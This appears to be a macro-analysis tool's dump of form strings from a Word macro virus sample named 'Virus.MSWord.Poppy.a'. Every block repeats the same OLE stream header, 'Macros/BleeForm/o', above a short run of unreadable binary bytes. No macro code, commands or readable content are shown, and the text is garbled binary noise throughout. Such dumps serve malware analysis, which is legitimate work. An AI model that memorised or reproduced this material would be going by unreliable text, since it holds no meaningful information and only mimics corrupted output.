- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)�՜�RD�Hߛq�G�F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ku�O�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���,�MU-t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2�2�@D�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6�,D��̠/+kOͿ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
֓I_Z�Uf����AGJ����=a!d
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X<d!'y� ���v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e�
�[v��:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��U1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��$\>���3�MUmE:�l��Z�SO
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H���mO̅�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\���.�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R=lP%<T�y\��pU�H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���5Iv�N�u��f�9.��@V��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��d�D�H��7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"Ln�*�D�jZZ%�t�b�#X�}��$ҪTHd
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ñs ��H�%Nܴ*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��D���*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��#`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
lh����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F�~|�ĝ�;SQ�nV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5����9�I$(�I�3��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\`6�pZ��v��=_=҆ؗ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kD���0TTA[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c�y}�!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	�K�=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
SF�J�dd��X�\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)#t;�O=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�⯪��\g�)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S��g��Q$�QS�uR�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"Bͅ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ʡs�\p}�W��&���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����6��T�1Z�,Tt���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��	�P2c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Wq���QCMIQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 A1fB�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

q��:�{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:�yt����W�SG
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�H�jy�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I"�I'�[i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8B�~0{Tu-q��H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OĿ��|����3�y�^f�d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;Z�A� ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t�%A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�*���#��Ӣ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S�硪A^>�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��W-�Y�W2��HO�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�\�2H_�׬Z1�?�?^�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1;��ɽ��;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-��/�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q����{���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:g>�t�� �c��&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����ӥ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=3����~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-wp׽����>����$��*���T�@��a�0*�a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pR���b���6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
WqS�S�rT�w1�����{g�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
žV^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s��~ߧ\*�JA#B��f?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=��1k�r�U��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W�j�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U%�g�G[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��T��OQT�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.Z)���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3k���e��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���k>!j���ZF�����;����R�Q���q��5�a�*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ڏ�}�շ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:E얻^��R�o�j��Ie�z�<��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{���(�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�cו�\U���;kk
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ݬtrj
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��"4?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�cKJϾZ�(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̟�wr�����W�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��{�ro����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c�R����n���Q��?��F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]��:���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{�M]f�׳
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�m5vӕT�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��)�/&�HĒ�Z5ڧs)Q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������_n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=a��բ���Hk�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��k��Q�\�u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ED���j䊭	�Ò��GĿ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kCL~*�oL���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v�z�\k�;��+�-lw]'`�Q���ӵ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�l���t�)�V���U ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��2��ӱHK�
��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���i��h��w�z뷔��P�����:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�gh�xb�JZO-e�x��|�r�Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r�����~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=��3�j.��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z�\ͦ��i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l.������+U�*��a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>��Oۉ�_��Z*;�q�tV+֊�Xm�8'i�(#J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=MuIzʶ��Z�Ó���I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N��m��A����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n����5�:���f���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��]�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

J&��Ѧ�5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4��@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(�#�%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6�{�R��_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5�${��;s�Y�ވ�ҴN�����W}M=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�gX�����<�W`�-�L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i�1�G����S��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���M�E���E�ç���H+j-�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y��X�W���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8;�⃸�>�j{U�O���&�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���&�Y%E2���D�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i(U�g�|���kMW:��Uk�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�nk-5G�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x}�}��W��u�ãk�h�(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tcNv�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��KO�V�-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N���W�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��0Z�)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�DU�Ɓi�[.�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_���_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��_w-Z�Tj�����]?Ko4%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`�����E��@�3&�+��E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4_���߻�j�z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ƿ��x���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q]�|˜���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�WY�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U��'8f��l|
-------------------------------------------------------------------------------
